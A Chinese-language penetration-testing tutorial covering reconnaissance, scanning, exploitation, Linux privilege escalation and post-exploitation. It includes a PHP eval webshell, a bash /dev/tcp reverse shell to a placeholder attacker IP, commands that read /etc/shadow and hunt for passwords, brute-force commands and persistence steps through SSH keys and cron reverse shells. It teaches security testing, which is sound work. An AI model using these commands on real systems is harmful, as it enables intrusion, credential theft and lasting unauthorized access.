## 1. 渗透测试标准流程

### 🏢 生活类比：电影里的盗窃计划

```
渗透测试 = 有计划、有章法的"安全测试"

  1. 踩点     → 观察大楼有几个门、保安几点换班（信息收集）
  2. 扫描     → 拿望远镜看哪个窗户没锁（漏洞扫描）
  3. 突破     → 翻窗进去（漏洞利用）
  4. 站稳     → 在大楼里找个角落藏起来（建立据点）
  5. 扩大     → 找到通往老板办公室的通道（提权+横向移动）
  6. 清理     → 消除进入过的痕迹（痕迹清除）
  7. 报告     → 告诉大楼管理员：你的窗没锁（渗透报告）
```

### 标准五步法（详版）

```
┌─────────────────────────────────────┐
│          渗透测试全流程                │
│                                      │
│ 阶段1: 信息收集（Reconnaissance）      │
│  ├─ 被动收集: Google/GitHub/WHOIS    │
│  └─ 主动收集: 端口扫描/目录枚举        │
│       ↓                              │
│ 阶段2: 漏洞发现（Scanning）            │
│  ├─ 自动化: Nessus/nmap script       │
│  └─ 手动: 逐个服务分析版本+已知漏洞     │
│       ↓                              │
│ 阶段3: 漏洞利用（Exploitation）        │
│  ├─ 获取初始访问(get shell)           │
│  └─ webshell / meterpreter / SSH     │
│       ↓                              │
│ 阶段4: 后渗透（Post-exploitation）     │
│  ├─ 提权: 普通用户→root              │
│  ├─ 信息收集: 密文/配置/网络拓扑       │
│  └─ 横向移动: 从这台机器到其他机器      │
│       ↓                              │
│ 阶段5: 报告（Reporting）              │
│  ├─ 漏洞详情+复现步骤                 │
│  ├─ 危害评估                         │
│  └─ 修复建议                         │
└─────────────────────────────────────┘
```

## 2. 📌 信息收集——踩点与侦察

**信息收集决定了渗透测试的成败。** 知道得越多，攻击面越大。

### 2.1 被动信息收集（不直接接触目标）

```
Google Hacking（Google Dork）:
  site:target.com filetype:pdf      → 搜目标站上的PDF
  site:target.com intitle:"index of" → 开放目录
  site:target.com inurl:admin       → 管理面板
  site:target.com ext:sql           → SQL 备份文件！

WHOIS 查询:
  whois target.com
  → 注册人、邮箱、电话、DNS服务器（全是信息！）

GitHub 搜索:
  site:github.com "target.com" password
  → 可能有程序员忘了删的密码和密钥！

Shodan/Censys/ZoomEye:
  搜索目标 IP 段 → 看看开了什么端口，跑了什么服务
```

### 2.2 主动信息收集（接触目标）

```bash
# ===== 子域名枚举 =====
# 子域名往往跑着不被注意的老系统、测试系统
subfinder -d target.com
amass enum -d target.com
# 或者用在线平台: crt.sh（通过证书透明日志查子域名）

# ===== 端口扫描 =====
# 快速扫描
nmap -sS -p- --min-rate 10000 target.com

# 服务版本识别
nmap -sV -p 22,80,443,3306,8080 target.com

# 默认脚本扫描
nmap -sC -p 80,443 target.com

# ===== 目录/文件枚举 =====
gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
dirsearch -u http://target.com
ffuf -u http://target.com/FUZZ -w wordlist.txt

# ===== 技术栈识别 =====
whatweb http://target.com     # 识别CMS、框架、服务器
wappalyzer                    # 浏览器插件，自动识别技术栈
```

### 🔥 信息收集清单

```
□ 主域名和所有子域名
□ 开放的端口和服务（含版本号）
□ Web 技术栈（CMS/框架/语言/服务器/CDN）
□ 隐藏目录和文件（robots.txt / .git / backup / admin）
□ WHOIS 和管理员联系方式
□ 关联的 GitHub/社交账号
□ SSL 证书信息（可能暴露内网域名）
□ 历史数据（Wayback Machine 上的旧版网站）
```

## 3. 漏洞扫描——自动化发现弱点

### 工具与用法

```bash
# ===== nmap 漏洞脚本扫描 =====
nmap --script vuln -p 80,443 target.com
nmap --script http-sql-injection -p 80 target.com

# ===== Nikto =====
nikto -h http://target.com

# ===== Nessus（商业扫描器，有免费社区版）=====
# 安装后新建Scan → 输入目标 → 等报告
# 最全面的漏洞扫描器

# ===== Web专项扫描 =====
sqlmap -u "http://target.com/page.php?id=1"  # 自动化SQL注入检测
```

### 🔥 扫描不是银弹

```
自动化扫描的局限：
  1. 不能发现逻辑漏洞（比如订单金额改负数白嫖）
  2. 不能发现需要多步骤配合的漏洞
  3. 会有大量误报（False Positive）

所以：扫描器扫一遍 → 人工验证每个可疑发现 → 手动探索业务逻辑
```

## 4. 漏洞利用——拿下初始访问

### 4.1 常见初始突破方式

```
Web 漏洞获取 webshell:
  文件上传漏洞 → 上传一句话木马 → 用蚁剑/冰蝎连接 → 获得命令执行

弱口令爆破:
  SSH: hydra -l root -P password.txt ssh://target.com
  FTP: hydra -l admin -P password.txt ftp://target.com
  后台: Burp Suite Intruder 模块爆破

公开漏洞利用（有已知CVE）:
  先查版本号 → searchsploit 搜 Exploit-DB → metasploit 打
  searchsploit apache 2.4.49     → CVE-2021-41773 路径穿越RCE

钓鱼（社工）:
  制作假冒登录页 → 发钓鱼邮件 → 骗取员工账号密码
```

### 4.2 拿到 Webshell 后

```bash
# 一句话木马（放在上传成功的 php 文件里）
<?php @eval($_POST['cmd']); ?>

# 用蚁剑/冰蝎连接
# 然后: whoami → 发现是 www-data（Web服务器用户）

# 接下来最重要的一步：升级到完整的交互式 shell
# 反连弹shell:
# 攻击机监听:
nc -lvnp 4444

# 目标机执行:
bash -c 'bash -i >& /dev/tcp/攻击机IP/4444 0>&1'

# 升级为完整TTY:
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z 把 nc 放后台
stty raw -echo; fg  # 回到 nc 并启用完整的终端功能
```

## 5. 📌 提权技术——从普通用户到root

**拿到了 www-data 不等于赢了。你还需要提权到 root。**

### 5.1 信息收集（上线后第一件事）

```bash
# ===== 你是谁，你在哪 =====
whoami && id && hostname
uname -a                     # 内核版本——找内核提权漏洞
cat /etc/os-release          # 发行版

# ===== 你能做什么 =====
sudo -l                      # ★最重要！看当前用户能sudo什么
find / -perm -4000 2>/dev/null  # 查找 SUID 文件
getcap -r / 2>/dev/null      # 查找 capabilities
cat /etc/crontab             # 定时任务——可能执行高权限脚本

# ===== 有什么敏感信息 =====
cat /etc/passwd && cat /etc/shadow  #（如果可读）
find / -name "*.conf" -o -name "*.config" 2>/dev/null  # 配置文件
find / -name "*backup*" -o -name "*.bak" 2>/dev/null   # 备份
grep -r "password" /var/www/ 2>/dev/null               # 找密码
cat ~/.bash_history          # 历史命令

# ===== 网络环境 =====
ifconfig / ip addr           # 你是哪个网段的
netstat -tlnp                # 本机开了哪些端口（可能有只监听本地的服务！）
arp -a                       # 局域网里还有谁
```

### 5.2 常见提权方式

```
┌────────────────────────────────────────┐
│              提权路径                    │
├────────────────────────────────────────┤
│                                        │
│  1. sudo 配置错误                       │
│     sudo -l 发现有程序可以无密码 sudo    │
│     → GTFOBins.com 查怎么利用           │
│     例: sudo vim → :!bash → root！     │
│                                        │
│  2. SUID 文件利用                       │
│     例: /usr/bin/passwd 有 SUID 位      │
│     → 但 passwd 正常，是 find/dash/vim  │
│       等有 SUID 且能执行命令的才危险      │
│                                        │
│  3. 内核漏洞提权                         │
│     uname -a 查到内核版本（如 4.15）     │
│     → searchsploit 搜对应内核的 exp      │
│     → DirtyCow / OverlayFS 等           │
│                                        │
│  4. 密码收集                            │
│     找配置文件里的密码                   │
│     → 用同样的密码尝试 sudo / su -       │
│                                        │
│  5. 定时任务注入                         │
│     cat /etc/crontab                    │
│     → 有 root 执行的脚本？改它！          │
│                                        │
│  6. Docker 组提权                       │
│     用户在 docker 组                    │
│     → docker run -v /:/mnt alpine       │
│     → 挂载整个根目录                     │
│                                        │
└────────────────────────────────────────┘
```

### 提权速查资源

```
GTFOBins (https://gtfobins.github.io)
  → 查任何 sudo 可执行的程序怎么利用

linPEAS / WinPEAS
  → 自动化提权信息收集脚本
  → 一行命令跑完所有信息收集

Linux Exploit Suggester
  → 输入内核版本，自动匹配可能的漏洞
```

## 6. 后渗透与横向移动

### 拿到 root 后做什么？

```
1. 维持访问
   → 加一个 SSH 公钥（authorized_keys）
   → 放一个定时反弹 shell 的脚本在 crontab

2. 收集凭证
   → 找浏览器保存的密码
   → 导出 /etc/shadow 离线破解（hashcat）
   → 抓内存中的明文密码（mimikatz）

3. 横向移动
   → arp -a 看局域网其他机器
   → 用本机做跳板（SSH隧道/端口转发）
   → 用收集到的密码尝试登录其他机器
```
